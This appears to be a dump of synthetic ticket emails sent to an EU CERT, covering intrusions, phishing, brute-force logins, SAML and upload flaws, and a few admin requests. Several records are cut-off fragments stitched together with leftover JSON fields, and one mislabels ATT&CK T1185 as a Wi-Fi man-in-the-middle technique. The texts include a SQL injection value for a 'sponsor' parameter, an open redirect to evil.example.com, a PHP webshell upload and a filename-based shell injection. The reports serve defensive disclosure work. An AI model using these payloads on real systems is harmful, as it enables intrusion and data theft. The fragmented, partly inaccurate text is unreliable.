During a scheduled internal audit on 2024-06-14, our technical team observed that the Mini-Beamer synchronization service, which interfaces with Microsoft Azure resources, is exposing a misconfigured SQL Server 2019 instance to the public internet. This was detected via routine port scans and confirmed by attempting connections from an external network segment.\n\nSpecifically, the SQL Server in question (hosted at hxxps://azure-euprojectdb[.]cloudapp.net) is accepting remote connections without IP restriction or enforced encrypted transport. The server is used to synchronize project data between various endpoints across multiple EU directorates. No authentication bypass has been observed so far; however, the lack of proper network segmentation and absence of firewall rules significantly increase the risk of brute-force attacks, credential harvesting, or potential data exfiltration.\n\nWe have attached anonymised connection logs and a technical summary (see PDF) outlining the affected configuration parameters, as well as steps to reproduce the open access condition. At this time, we have not detected evidence of exploitation or data leakage, but given the sensitivity of synchronized project files (some containing personal and restricted information), this exposure may have serious implications under GDPR and NIS2 obligations.\n\nWe recommend urgent review of the Azure SQL Server network access controls and the implementation of appropriate firewall rules.

EDR logs (CrowdStrike) show the binary spawning network requests using TLS with self-signed certs and rotating SNI values (sample: field-report-0428.trace-crop[.]net).\n\nNo staff have reported issues, but the timing overlaps with our annual pesticide database update, so we\u2019re worried about targeted data harvesting or initial access for future campaigns.

Please excuse the directness\u2014I\u2019m forwarding this report ASAP due to the nature of the finding and its potential for abuse.\n\nWhile examining the login and password reset workflows, I noticed the \u201cnext\u201d parameter in the GET request to /auth/redirect is not properly validated. By modifying the \u201cnext\u201d value to an external domain (e.g., https://evil.example.com), the application reliably redirects the user\u2019s browser off-site after authentication or password reset completion, without warning. This can be triggered both via crafted links and through manipulated form submissions.\n\nI\u2019ve attached a sanitized HTTP request/response log (see attached: eulisa_openredirect_logs.txt) and a short PoC script that demonstrates the behavior. My concern is that attackers could exploit this to facilitate phishing campaigns targeting applicants, potentially capturing credentials or sensitive data under the guise of legitimate EULISA communications. The flaw does not appear to require authentication and is reachable via both desktop and mobile browsers. I haven\u2019t attempted any further exploitation beyond confirming the redirection and did not interact with any real applicant data.\n\nGiven the popularity of the portal and the volume of personal information processed, I believe this warrants prompt attention.

Our analysts have observed an uptick in malicious wireless network activity targeting staff and contractor devices within our primary office locations. Specifically, there is evidence of rogue Wi-Fi access points (APs) emulating legitimate \"ECA-Staff\" and \"ECA-Guest\" SSIDs, intermittently disrupting connectivity and attempting credential interception via captive portal phishing.\n\nInitial telemetry (see attached CSV: \"suspect_wifi_events_2024-06.csv\") indicates that these rogue APs broadcast from varying MAC addresses in the ranges associated with commonly spoofed Netgear and TP-Link hardware. Several connection attempts were registered during peak working hours, with users reporting unusual authentication prompts and, in some cases, redirected browser traffic to defanged credential harvesting portals (e.g., hxxps://secure-login[.]eca-audit[.]eu).\n\nOur investigation is ongoing, but we suspect these activities may be linked to a broader actor campaign employing T1557 (Adversary-in-the-Middle) and T1185 (Man-in-the-Middle via Wi-Fi) techniques, possibly in conjunction with commodity Wi-Fi Pineapple hardware.

At first, we thought it was just routine maintenance, but this morning, our own admin logs (Pulse Secure) show multiple failed login attempts for a handful of users who are all in the editorial group. The odd part is that these attempts came from IPs that are not in our usual geolocation range (e.g., 102.135.45.221, 41.218.72.53 \u2013 both show up as Africa in our GeoIP lookup, which is definitely not normal for our staff).\n\nOne user, 'editor_mleclerc', got locked out after a series of failed logins, but she swears she wasn\u2019t even online at the time. I checked with our external IT support, and they noticed the same pattern for two other editorial accounts. Our SIEM (LogPoint) flagged these as \u2018Brute Force - External Source\u2019 but only after about 30 attempts per account. I\u2019ve attached a snippet from the [vpn_access.log] below (apologies for the formatting, it\u2019s a bit messy):\n\n2024-07-11 22:31:14 AUTH_FAIL user=editor_mleclerc src_ip=102.135.45.221 device=Win10\n2024-07-11 22:31:16 AUTH_FAIL user=editor_mleclerc src_ip=102.135.45.221 device=Win10\n2024-07-11 22:31:19 AUTH_FAIL user=editor_mleclerc src_ip=102.135.45.221 device=Win10\n...\n2024-07-11 22:32:10 AUTH_LOCKOUT user=editor_mleclerc src_ip=102.135.45.221\n\nNo successful logins from these IPs so far, but it\u2019s odd that the attempts happened during off-hours (22:30\u201323:00 CET) and targeted only editorial staff. I\u2019ve already reset the affected accounts and forced password changes. No other systems seem affected at this point, but we\u2019re still digging.\n\nCould you please advise if this pattern matches any known campaigns or if you need more logs? Not sure if we\u2019re looking at credential stuffing or a targeted attack.

Over the past ten days, our honeypots (deployed on IPv6 segments unused in prior campaigns) registered a surge in inbound SSH brute-force attempts followed by deployment of a previously unseen PowerShell loader. This loader (SHA256: 7a1c0e4fd7a5f95b3c6b1a97f2e18f8e1cfc7b61f2d43c9b81f634eea50f9cbb) fetches the main payload from hxxp://amber-dl1[.]cc-archive[.]ru/dropper.bin.\n\nDistinctively, the C2 traffic routes through a fresh set of domains (full list in attached CSV) and the observed TTPs diverge from previous PaleAmber playbooks. For example, lateral movement attempts now leverage WMI (MITRE T1047) instead of their typical PsExec-based approach. Additionally, ransom notes are now dropped in both English and German, possibly indicating a shift in targeting towards DACH-region institutions.\n\nWe also noticed the loader attempts persistence via registry run keys and a scheduled task labeled \u201cUpdate_Sync\u201d, which isn\u2019t in line with previously documented variants. Our initial analysis links this infrastructure to the \u201cGreenPeak\u201d affiliate, based on SSL cert reuse (see attached cert fingerprints).\n\nWe are sharing:\n- A zipped CSV with 12 new C2 domains and associated IPs\n- Extracted loader and ransom note samples\n- Timeline of observed activity (2024-07-19 to 2024-07-30)\n\nCould you please cross-reference these indicators with your threat feeds and share any sightings, especially in relation to recent DACH-region attacks? Any additional info on GreenPeak affiliate\u2019s activity would be very helpful.\n\nMerci d\u2019avance pour votre collaboration.

Our team has initiated the deployment of enforced multi-factor authentication (MFA) for all privileged accounts, but we seek your threat intelligence input on the following:\n\n- Are there active campaigns targeting MFA implementations on similar network appliances within the EU constituency?\n- Do you have recent IOCs, infrastructure links, or campaign codenames associated with this activity?\n- Can you provide guidance on hardening MFA deployment in research environments, or share relevant incident response playbooks?\n\nFor your reference, we have attached a zipped IOC bundle (TLP:AMBER) including source/destination IPs (defanged), timestamps, and relevant authentication error logs. Please advise if additional forensic artefacts or network telemetry would be useful for correlation or further analysis.\n\nThank you for your collaboration and ongoing support.

During routine monitoring this week, our SOC identified multiple attempts to exploit a recently disclosed zero-day vulnerability (CVE-2024-22851) in our legacy medical records management platform, which supports several cross-border regulatory projects.\n\nInitial forensic analysis indicates that the exploitation attempts originated from a cluster of IP addresses previously associated with the \"Night Owl\" actor group, noted for targeting European health sector entities. The attacks coincide with the publication of proof-of-concept exploit code on underground forums frequented by cybercriminals (see attached dark web intelligence summary, TLP:AMBER).\n\nAlthough we have implemented immediate mitigations\u2014including temporary segmentation of the affected subnet and expedited patch deployment where feasible\u2014several unauthorized access attempts were detected prior to these measures.

During recent integration testing for the new staff onboarding portal, I stumbled on a potential authentication issue affecting the EULogin SAML implementation in our DG HR test environment (auth-test.hr.ec.europa.eu). This message is in line with the coordinated vulnerability disclosure protocol.\n\nWhile validating SSO for the onboarding workflow, I noticed that manipulating the SAMLResponse parameter\u2014specifically, omitting the InResponseTo attribute\u2014allowed access to protected staff resources without valid session tokens. The app does not appear to verify SAML assertions against issued requests, nor does it enforce audience restrictions, so a crafted response is accepted as long as the signature is syntactically correct. Using the open-source samltool.io, I was able to forge a valid assertion referencing my own test account and gain access to the HR dashboard. No admin privileges obtained, but I could view PII for several onboarding users (names, emails, job titles).\n\nI have attached a HAR capture and the crafted SAML assertion (sanitised), plus screenshots demonstrating the unauthorised session. I have not attempted to escalate privileges or access production data, and have reverted all test accounts to avoid disruption.

I\u2019ve continued investigating and, unfortunately, have uncovered a significant cryptographic weakness affecting the SAML assertion validation process. This vulnerability appears to allow a malicious actor to bypass signature verification by exploiting an implementation flaw in the XML parser used by the backend authentication module (specifically, the custom integration with xmlsec1 on the Red Hat 8.9 stack).\n\nDuring repeated tests on our UAT environment, I was able to forge a SAML response by manipulating the Reference URI and injecting a secondary assertion with a valid, though unrelated, signature. The parser does not correctly enforce the unique ID constraints, so it accepts the injected assertion as authentic, which then grants session tokens for arbitrary user accounts. No advanced tools needed\u2014just Burp Suite and some manual editing of the SAML response.\n\nTo be clear: this was not tested on production, and no actual user data was accessed. Logs and request samples are attached for reference (see: saml_assertion_bypass_eulisa.txt). Our initial risk assessment is high, as this affects all federated authentication to internal HR and payroll modules, potentially exposing sensitive employee data.\n\nWe are currently working to restrict access to the vulnerable endpoints and have notified our own IT Security. Given the potential impact and the EU-wide integration of EULISA systems, we would appreciate guidance on coordinated disclosure and your support in validating the scope. Happy to jump on a call if you need more technical details or a demonstration.\n\nSorry for the long email, but I thought more detail would help.

We\u2019ve noticed a spike in outbound DNS queries from several endpoints in our regulatory affairs subnet (10.41.18.0/24), all targeting domains that haven\u2019t previously appeared in our traffic baselines. The pattern first emerged on Monday and has persisted, with the majority of queries occurring outside of normal business hours.\n\nInitial investigation via Zeek and our DNS logging revealed repeated lookups for domains like \u201cema-verifynow[.]org\u201d and \u201cpharmarecords-update[.]eu\u201d. These were registered within the past month, and both resolve to IPs in the 193.56.149.0/25 range, hosted out of Latvia. Passive DNS shows no prior history for these domains, and our internal asset inventory confirms none of our legitimate services should be reaching out to them.\n\nWe ran a quick check in our MISP instance (TLP:GREEN) and found a handful of recent indicators matching the above IP range, flagged as potential C2 infrastructure in a report from a Baltic sector CERT. However, there\u2019s no direct attribution yet. We also noticed the DNS queries are being generated by a process named \u201cupdatehost.exe\u201d on affected endpoints, which doesn\u2019t match any approved software in our environment. We\u2019ve isolated three devices for further forensic analysis and blocked outbound connections to the suspicious domains at the firewall.\n\nGiven the overlap with indicators from the Baltic CERT and the use of plausible pharma-themed domains, we suspect this could be part of a targeted campaign against health sector entities.

Earlier today (02 July 2024, ~10:42 CET), our internal monitoring system (Elastic SIEM) flagged unusual outbound connections originating from the Tableau Server instance. These connections were directed to an external IP address (185.200.116.41), which is not on our approved list and appears associated with a VPS provider in Eastern Europe.\n\nUpon closer review, we observed that the Tableau process initiated multiple HTTPS sessions with irregular user agent strings (e.g., 'python-requests/2.28') and transferred several large data payloads during non-business hours (see attached [netflow.log] and [tableau_server.log] extracts). No scheduled data exports or legitimate API calls were planned for the affected timeframes. The destination endpoint (hxxps://data-sync[.]cloud) is not referenced in any of our documented integrations or third-party contracts.\n\nWe have initiated containment by disabling external network access for the Tableau server and rotating associated service account credentials. Our preliminary investigation suggests possible exploitation of a plugin vulnerability (CVE-2024-XXXX, under review), potentially allowing unauthorised data exfiltration. At this stage, we cannot confirm the full scope of data affected, but preliminary indicators suggest exposure of internal investment dashboards and possibly underlying raw datasets.\n\nGiven the sensitivity of the financial data involved and potential NIS2/GDPR implications, we request urgent DFIR support to:\n- Conduct forensic analysis of the Tableau server and correlated endpoints\n- Assess for evidence of lateral movement or further compromise\n- Advise on notification requirements and additional containment steps\n\nRelevant logs and session metadata are attached for your review. Please let us know if you require full memory dumps or additional artefacts. We are prepared to coordinate with the Data Protection Officer and external partners if needed.\n\nThank you for your prompt attention.

This message is submitted under the CERT-EU Coordinated Vulnerability Disclosure process and aligns with the security obligations under NIS2 and the Council\u2019s internal ICT security guidelines.\n\nWhile reviewing user access patterns and exploring recently introduced collaboration features, I identified a weakness related to the file upload component embedded within the real-time dashboard customization interface. Specifically, the drag-and-drop upload functionality appears to lack proper file type validation and sanitisation checks at both client and server-side layers. Testing with an account provisioned for standard project management (not admin), I was able to upload .php and .aspx files through the widget interface. The system did not reject these uploads, and the files became accessible under predictable URLs in the /user-uploads/ directory (example: hxxps://pm-tool.consilium[.]europa[.]eu/user-uploads/injected_file.php).\n\nFurther investigation suggests that, if an attacker were to exploit this vector, it might allow for remote code execution or at the very least facilitate phishing attacks by serving malicious scripts from a trusted Council subdomain. I did not attempt to execute any uploaded scripts or escalate beyond initial discovery to avoid impacting production systems, and I have documented the findings in an attached PDF (file_upload_dashboard_widget_findings.pdf), including step-by-step reproduction instructions and server response headers.\n\nGiven the widespread use of this platform across various Council working groups, the risk of data compromise or lateral movement could be significant, especially if leveraged in conjunction with other workflow automation features.

During a routine review of our network telemetry and SIEM alerts (covering the past 48 hours), we detected anomalous outbound connections from a segment of our research infrastructure to several external IP addresses (see attached CSV). These connections coincided with a sudden increase in failed encryption events logged by our EHR (Electronic Health Records) platform.\n\nInitial analysis suggests the affected systems may have been compromised via exploitation of a recently disclosed vulnerability in the MedCryptor software suite (CVE-2024-1867). Notably, we observed the presence of a suspicious process (\"medcryptsvc.exe\") with an unsigned binary hash (SHA256: 9e2a...b13c) communicating with hxxps://medsec-data[.]net. This behaviour was first flagged by our EDR tool and appears to bypass existing firewall rules, likely due to misconfigured segmentation policies.\n\nWe have isolated the impacted hosts and initiated forensic imaging. No ransomware note or exfiltration evidence has been confirmed at this stage, but we remain concerned about potential data leakage given the sensitivity of patient records and NIS2/GDPR compliance requirements. We have attached a zipped IOC set (TLP:AMBER) including process hashes, network indicators, and relevant log extracts for your review.\n\nCould you please advise if these indicators match any known threat actor TTPs or ongoing campaigns targeting EU healthcare infrastructure?

My name is Jean-Paul Lefevre, and I am a cybersecurity researcher with the CNRS-LIMSI (Laboratoire d\u2019Informatique pour la M\u00e9canique et les Sciences de l\u2019Ing\u00e9nieur), currently collaborating on the EU-funded SYNAPSE project. I am reaching out to share threat intelligence that may be of interest for your current monitoring of botnet C2 infrastructure across member states.\n\nLast week, during a comparative analysis of DNS telemetry collected from French academic networks, our team identified a cluster of anomalous DNS queries originating from several endpoints in university research labs. These queries resolved to a previously unlisted set of domains exhibiting fast-flux behavior and short-lived A records. Example domains include:\n- hxxp://recherchedata-sync[.]net\n- hxxp://lib-cloudlink[.]org\n\nReverse DNS and passive DNS analysis suggest these domains are part of a new C2 infrastructure, possibly associated with the re-emergence of the Hailstorm botnet variant (noted in recent sector ISAC advisories). Notably, the queried IPs (e.g., 194.34.119[.]87, 37.221.129[.]156) have surfaced in the past month in connection with credential theft campaigns targeting European research consortia.\n\nEnclosed as an attachment is a CSV file containing extracted indicators: domain names, observed IP addresses, timestamps, and associated user agent strings (defanged as per TLP:AMBER). For context, the MITRE ATT&CK techniques most relevant appear to be T1095 (Non-Application Layer Protocol) and T1071.004 (Application Layer Protocol: DNS).\n\nWe have not, as yet, confirmed any payload delivery or lateral movement within our networks, but the pattern is consistent with pre-infection beaconing observed in prior Hailstorm campaigns. We have also flagged the domains in our local DNS sinkholes and notified affected endpoints for further forensic review.\n\nCould CERT-EU CTI assist by:\n- Checking for any matches or enrichment on these IOCs in your datasets or partner feeds\n- Providing insight on recent Hailstorm botnet activity or infrastructure shifts, especially if linked to ongoing campaigns in the education or research sector\n- Advising if additional data (e.g., full packet captures or endpoint logs) would be beneficial for deeper analysis\n\nWe appreciate your attention to this matter. Please let me know if you require any clarifications or further context. We will continue monitoring and will share any new findings as they emerge.\n\nKind regards,\n\nJean-Paul Lefevre\nCybersecurity Researcher\nCNRS-LIMSI, Paris", "created_date": "2024-09-09T00:00:00", "email_address": "jeanpaul.lefevre@cnrs.fr", "assigned_queue": "CTI"}

The subject is: \"Update: Confirm Participation in EU Cybersecurity Symposium 2024\". Sender listed as \"events@eucyber-symposium[.]org\" (defanged for safety).\n\nThe email claims to invite recipients to finalize their registration for the upcoming \"EU Cybersecurity Symposium\" in Florence. It provides a link (defanged: hxxps://registration[.]eucyber-symposium[.]org/secure-checkin) to \"validate your attendance and complete security clearance forms.\" However, we have no knowledge of this event being organized in partnership with us or any other official EU institution. The sender\u2019s domain is not recognized in our usual event communications and does not resolve to a legitimate organizational site.\n\nA few points of concern:\n- The landing page mimics the look of our real EUI event portal, but with subtle differences (e.g., old logo, missing legal disclaimer in footer).\n- The registration form asks for institutional credentials (email + password) and, unusually, also requests passport scans \u201cfor venue security.\u201d\n- Language is mostly formal, but some phrases are off (\"participation validation is necessary for event compliance reasons\").\n- Multiple staff in the Law and Computer Science departments received identical emails (Bcc'd).

The initial alert came from our Azure Sentinel dashboard at 07:54 CET, which flagged multiple failed logins followed by a successful authentication for userID 'petra.s' originating from two different geographic locations within a 20-minute window (IP: 213.211.164.78, DE, and 82.112.55.90, BG). This pattern triggered our conditional access risk policy (see attached screenshot).\n\nA review of [vpn_auth.log] reveals the following sequence:\n\n2024-07-16 07:41:12 | petra.s | 213.211.164.78 | Failed login\n2024-07-16 07:46:23 | petra.s | 82.112.55.90 | Failed login\n2024-07-16 07:54:03 | petra.s | 82.112.55.90 | Successful login\n\nThe user claims she was not attempting to connect at those times and is currently in Brussels. MFA was enabled for her account, but the successful login did not prompt for a new second factor, which may indicate token theft or session hijack. There\u2019s no indication (yet) of privilege escalation, but access logs show some anomalous file download requests from internal SharePoint sites immediately after the VPN session was established.\n\nWe have already disabled the affected account and revoked all active sessions as a precaution. Endpoint logs from the user\u2019s assigned laptop (host: ep-lt-2139) do not show malware activity, but we are still running a full scan via Defender ATP. No other users appear impacted so far, but we are expanding our search to similar authentication anomalies over the past 48 hours.\n\nGiven the potential risk of unauthorized data access and possible breach of personal or sensitive documents, we request immediate DFIR assistance to:\n- Investigate the authentication bypass/MFA failure\n- Identify potential lateral movement or data exfiltration\n- Advise on further containment and communication steps\n\nPlease let us know if you require any additional artefacts (log exports, endpoint images, etc.). We can arrange a coordination call later today if needed.\n\nBest regards,\n\nJean-Paul Laurent\nIT Security Officer\nDirectorate-General for Innovation and Technological Support (DG ITEC)\nEuropean Parliament", "created_date": "2025-06-29T00:00:00", "email_address": "jean-paul.laurent@ep.europa.eu", "assigned_queue": "DFIR::incidents"}

This issue was encountered during my routine use of the system as part of my duties within the Directorate-General for Health and Food Safety (DG SANTE).\n\nOn 21 May 2024, I experienced an unexpected denial of access to my medical data account. My credentials, which were valid earlier that morning, suddenly failed with repeated 'invalid password' errors. I verified that my password had not expired, checked for any recent password policy notifications, and attempted to reset my password via the official recovery process. Despite following all recommended troubleshooting steps (device restart, credential verification, reference to the user manual), the problem persisted.\n\nUpon further investigation, I noticed that after several unsuccessful login attempts (approx. 3-5), my account was automatically locked out for an extended period without any prior warning or CAPTCHA challenge. There was no notification regarding suspicious activity, nor any guidance on the lockout duration. Reviewing the portal\u2019s authentication flow (using browser developer tools), I observed that the login endpoint does not appear to implement rate limiting or progressive delays, and failed login attempts do not trigger secondary verification (such as 2FA or security questions). This could potentially expose the system to credential stuffing or brute-force attacks, and also risks unintentional denial of service for legitimate users due to overly aggressive lockout thresholds.\n\nGiven the sensitivity of personal health data and our obligations under NIS2 and GDPR, I believe this constitutes a significant security concern. I have attached a PDF with step-by-step reproduction details, HTTP request samples, and relevant screenshots (with personal information redacted). No exploitation beyond these controlled tests was performed.\n\nPlease advise on your preferred timeline for coordinated remediation and whether further technical evidence or logs are required from my side.

The attempts were spaced over roughly 7 minutes, then suddenly, at 13:58, there\u2019s a successful login using the same account from that same IP.

SHA256: 7f6d8e...redacted...\n- System logs show that the script attempted outbound connections to hxxps://market-sync[.]info/api, which is not a whitelisted endpoint for our analytics software.\n\nActions taken so far:\n- Terminated the suspicious session and disabled the 'econadmin' account pending further review.\n- Isolated fin-forecast01.ec.europa.eu from the internal network.\n- Collected and attached relevant logs (auth.log, sudo.log, network_traffic_20240625.pcap) for your analysis.\n\nGiven the failed and then successful authentication attempts, followed by privilege escalation and unknown script execution, we suspect a possible account compromise and privilege abuse incident. We have not yet identified signs of data exfiltration, but investigation is ongoing. No other hosts have reported similar anomalies as of this morning.\n\nWe request CERT-EU's support for forensic triage, particularly to determine the scope of compromise and whether further containment is required.

This is a follow-up to our earlier phone call this morning regarding a potential data exfiltration incident that was flagged late last night (15/07/2024, approx. 23:50 CET).\n\nOur DLP (Symantec DLP v15.8) generated a high-severity alert for unusually large outbound transfers from an internal research database server (host: rdb-core03.ema.europa.eu) to an external IP (37.221.77.41) not previously seen in our traffic logs. The transfer involved a compressed archive (filename: research_extract_20240715.tar.gz, SHA256: 0e9a1c6b8c7f43d2b92d1b7d5e3cfae5e19c2f1d1c1e2f9a4b1d6e9f0a3b7c6d) containing what appears to be clinical trial data. The alert was triggered by a custom policy for regulated datasets, which matches our internal controls for GDPR/NIS2 compliance.\n\nWe immediately reviewed [netflow] and [syslog] records for rdb-core03 and identified the transfer as initiated via an SSH session by user \u2018dbsvc_rsch\u2019, a service account not normally permitted to access external hosts. The session originated from a jump box (host: jmp-02.ema.europa.eu) using a key pair last rotated in April 2023. There\u2019s no corresponding change ticket or approved data export logged for this activity, and the user\u2019s credentials were last updated only two days ago, which is odd.\n\nAs an initial containment measure, we have disabled the \u2018dbsvc_rsch\u2019 account, revoked all active SSH keys for the jump box, and blocked outbound connections to the suspicious IP at the firewall.

At first, I assumed it was just a network hiccup or a permissions issue, but after digging into the logs this morning, I noticed a string of failed authentication attempts from a single workstation (host: eesc-wrk-14) that didn\u2019t make sense\u2014especially since the user (marc.dupont@eesc.europa.eu) was supposedly on leave all week.\n\nHere\u2019s where it gets odd: the failed logins started around 22:17 CET last night, and then, at 22:29, there was a successful login from the same host, but using a different account (svc_backup), which is only supposed to be used by our backup system and never interactively. Right after that, I saw a batch of large file transfers from the \u2018Confidential_Projects\u2019 directory to a mapped drive (Z:), which shouldn\u2019t be possible outside scheduled backup windows. The [security.evtx] logs show Event ID 4624 for svc_backup, with a logon type 10 (remote interactive), and the source IP matches eesc-wrk-14. There\u2019s also a weird process tree: powershell.exe spawning robocopy.exe, which isn\u2019t normal for our backup jobs.\n\nI\u2019ve temporarily disabled both the user and service accounts and isolated the workstation from the network. I\u2019m still reviewing our Veeam backup logs and checking if anything else was touched, but I\u2019m worried this might be a targeted attempt to exfiltrate sensitive project files. We don\u2019t have EDR deployed on all endpoints yet, so I can\u2019t say for sure if there\u2019s malware involved, but the timing and use of the backup account are definitely suspicious.\n\nCan you please advise on next steps?

We recently completed a security assessment of our collaborative research tool, CollabNotes, which is widely used by multiple Horizon 2020 project teams, including several joint projects with the European Environment Agency (EEA). During our audit, we identified a critical issue affecting the file upload functionality of the platform\u2019s RESTful API.\n\nTo summarise, the endpoint POST /api/upload/notes allows file uploads intended for internal note attachments. However, our penetration tests revealed the upload handler fails to enforce server-side file type validation and does not sanitise file extensions. By uploading a PHP webshell (see attached: poc_shell.php.txt), we confirmed remote code execution was possible on the backend server (collabnotes.h2020-pavia[.]eu). This exposes the system to arbitrary code execution, server takeover, and lateral movement within the project\u2019s shared infrastructure.\n\nFurther analysis of the container logs suggests the vulnerability is present in the open-source NoteHandler library (v2.5.4), which is also used by several other EU-funded academic collaborations (e.g., enviroshare.eu, openbio-db.eu). We have not detected any signs of exploitation so far, and have restricted upload functionality as a temporary mitigation.\n\nAs per our internal process, we have not publicly disclosed this finding and are reporting under the CERT-EU Coordinated Vulnerability Disclosure guidelines. We would appreciate guidance on next steps, particularly regarding coordinated notification to affected project partners who may have deployed the vulnerable library.\n\nPlease let us know if you require a more detailed technical breakdown, exploit demonstration, or direct access to a test instance.

We have received the draft purchase order (PO #2024-3129) from your finance department, but there are a few administrative clarifications we would like to address before proceeding with the signature process.\n\nFirstly, the service period listed in the draft PO (15/07/2024 \u2013 14/07/2025) does not align with the original framework agreement, which stipulates an annual renewal date of 1 August. Could you please confirm whether this discrepancy is intentional, or if an updated PO will be issued to reflect the correct term? Our internal compliance guidelines require exact date matching for contract renewals, and any deviation must be formally documented.\n\nSecondly, the draft PO references the use of the EU eInvoicing platform for payment processing. We would appreciate confirmation on whether all related documentation (invoices, delivery reports, acceptance certificates) should be submitted exclusively via the platform, or if parallel submission to the CERT-EU shared mailbox is still required for audit purposes. Last year, there was some confusion on this point, resulting in delayed payment.\n\nLastly, please advise if any additional administrative steps are necessary from our side regarding the onboarding of new training modules (the vendor has proposed several content updates for 2024). Should we forward the updated course outlines to your HR training coordinator, or is there a specific contact person managing the approval of cybersecurity awareness content?\n\nI have attached the draft PO and the vendor\u2019s revised course proposal for your reference.

Basically, when sending crafted payloads to the /v2/imports/upload endpoint (specifically via the 'filename' POST parameter), it looks like the backend is echoing the value directly into a shell command for file handling.

Our team will include Dr. Alessandra Grassi (faculty) and two PhD students (Marco L. and Giulia F.), and we want to ensure all ID documentation and short-term contracts are submitted as required. If there\u2019s a standard template or list of required forms for academic visitors, could you please share it? We\u2019d prefer to complete as much paperwork in advance as possible, since our university admin office is quite slow with last-minute requests (especially around the August holiday period).\n\nSecondly, regarding travel and accommodation arrangements, we understand that each institution usually covers its own costs, but our finance office has asked if CERT-EU can provide an official invitation letter and confirmation of the workshop schedule. This is apparently necessary for our Erasmus+ mobility grant reporting. Would it be possible to send a signed PDF on CERT-EU letterhead confirming the dates (17-19 September) and outlining the main topics? If you have a standard format for these invitations, please let us know.\n\nLastly, do you require any specific COVID-19 health certificates or insurance documentation for on-site access?

The issue appears to affect the handling of search query parameters in the registry\u2019s public API endpoints. \n\nWhile investigating unusual traffic patterns flagged by our SIEM last week, our analysts noticed a spike in malformed requests targeting /api/v2/trials/search. Upon closer inspection, we determined that the API fails to adequately sanitize certain input fields\u2014specifically, the \u2018trialId\u2019 and \u2018sponsor\u2019 parameters. By injecting a crafted payload into the \u2018sponsor\u2019 field (e.g., trialId=2023-5421&sponsor=%27%3B+SELECT+version%28%29--), we were able to trigger SQL syntax errors in the backend logs. The errors leak limited database metadata, including the underlying PostgreSQL version and table structure, which suggests a possible SQL injection vector. \n\nWe have not confirmed exploitation beyond information disclosure at this stage; no unauthorized data access or modification has been observed. Our technical team is still analyzing the logs to determine if there was any lateral movement or deeper compromise. For now, we have implemented temporary WAF rules to block suspicious requests and are preparing a hotfix for the affected endpoints. \n\nPlease find attached a redacted snippet of the relevant log entries and a short technical write-up outlining our findings and preliminary PoC steps (ema_trialsdb_api_sqli_findings.pdf).

Earlier this morning (15 July 2024, ~08:20 CET), our IT Helpdesk received a report from a staff member (user: sandra.leclerc@europarl.europa.eu) who noticed multiple VPN login notifications on her mobile device overnight, despite not having accessed the network remotely since last Friday.\n\nUpon initial review, our VPN gateway logs ([openvpn.log]) show three successful connections for user \u2018sandra.leclerc\u2019 between 02:13 and 03:05 CET, originating from IP 92.38.148.72 (ASN: M247 Ltd, registered in Germany). This is not a usual location for our staff, and her last legitimate login was from Brussels office IP 10.44.21.33 on 12 July. The log entries below are from our central SIEM (Splunk):\n\n2024-07-15 02:13:22 CET | user=sandra.leclerc | src_ip=92.38.148.72 | device=OpenVPN-GW01 | auth=success\n2024-07-15 02:48:09 CET | user=sandra.leclerc | src_ip=92.38.148.72 | device=OpenVPN-GW01 | auth=success\n2024-07-15 03:05:47 CET | user=sandra.leclerc | src_ip=92.38.148.72 | device=OpenVPN-GW01 | auth=success\n\nNo corresponding failed attempts were seen prior to these sessions, which suggests valid credentials were used. The user claims she did not initiate any of these connections and her laptop was powered off at home during the time in question. MFA was enabled, but our logs indicate that push notifications were approved from her registered device. She now suspects her phone may have been compromised or that MFA fatigue was exploited.\n\nWe have already disabled her account and revoked all VPN sessions as a precaution. No unusual activity has been observed on her mailbox or SharePoint access so far, but we are still reviewing other logs. The user has been instructed to bring in her laptop and phone for forensic imaging.\n\nCould you please advise on the following:\n- Recommended steps for confirming whether her mobile device was compromised\n- Any additional indicators we should search for in our VPN and authentication logs\n- Guidance on further containment and notification requirements under NIS2\n\nWe are escalating this as a possible account compromise with risk of unauthorized remote access to internal systems. Please let us know if you need additional log files or wish to coordinate directly with our IT Security team.\n\nSorry for the early-morning ping, but given the context, we wanted to get this on your radar ASAP.\n\nBest regards,\n\n\u2014\nPierre Dumont\nIT Support Specialist\nEuropean Parliament\npierre.dumont@europarl.europa.eu", "created_date": "2024-12-12T00:00:00", "email_address": "pierre.dumont@europarl.europa.eu", "assigned_queue": "DFIR::incidents"}

The ANSSI threat analysis team began tracking this activity following a report from a regional IT director noting intermittent access disruptions and unexplained credential lockouts affecting staff in the Ministry of Justice.\n\nInitial triage of authentication logs revealed a series of login attempts originating from three IP addresses geolocated in Central Asia (see attached IOC list, TLP:GREEN). The access patterns mimic legitimate user behavior, but timing analysis suggests automation, with login bursts every 37 minutes precisely, including during local holidays. We also observed failed logins using service accounts that have not been active since early 2022.\n\nEnrichment with our MISP instance linked two of the IPs to previous spear-phishing campaigns attributed to the \"Blue Ember\" group (internal ANSSI codename), believed to be affiliated with a nation-state actor previously implicated in targeting EU diplomatic missions (see MITRE ATT&CK T1078.004, T1110.003). Notably, the observed TTPs include password spraying and subsequent IMAP brute force, with attempts to bypass SSO restrictions via legacy authentication endpoints.\n\nWe have not yet confirmed any successful compromise, but there are signs of reconnaissance for privilege escalation\u2014particularly attempts to enumerate admin panels and legacy OWA interfaces. No malware delivery detected so far. Our team is still analyzing full packet captures for possible C2 beaconing.\n\nActions requested:\n- Please check for similar authentication anomalies or Blue Ember TTPs in your respective institutions\n- Share any recent IOCs or forensic artefacts related to this group\u2019s activity, especially targeting government email infrastructure\n- Advise on additional monitoring rules or correlation queries you recommend\n\nApologies for any formatting oddities\u2014rushing this out to get your eyes on it quickly.

These queries were executed outside standard maintenance windows and involved large-scale SELECT and EXPORT operations targeting tables containing sensitive patient information and staff credentials. The activity originated from an internal IP (10.32.14.17) not previously associated with administrative sessions.\n\nA preliminary investigation revealed the Oracle Database server was running an outdated version (Oracle 12.1.0.2), with several unpatched CVEs, notably CVE-2023-21887 and CVE-2023-21931. Review of [oracle_audit.log] and [network_traffic.pcap] (attached) indicates that, shortly before the anomalous queries, there was a successful authentication event using a previously expired account (db_ops_eu), suggesting possible credential reuse or privilege escalation.\n\nDespite recent endpoint scans with McAfee EDR and the application of a critical GNU Compiler patch, the unauthorised access persisted. We have since isolated the affected database host and revoked all active sessions. However, we lack clarity on the extent of data exfiltration and whether any lateral movement occurred within our medical IT infrastructure.\n\nGiven the nature of the data involved, we are treating this as a potential breach under GDPR and NIS2 requirements. Immediate assistance is requested for forensic triage, root cause analysis, and recommendations for containment. All relevant logs, network captures, and an export of suspicious queries are attached for your review.\n\nPlease advise if further 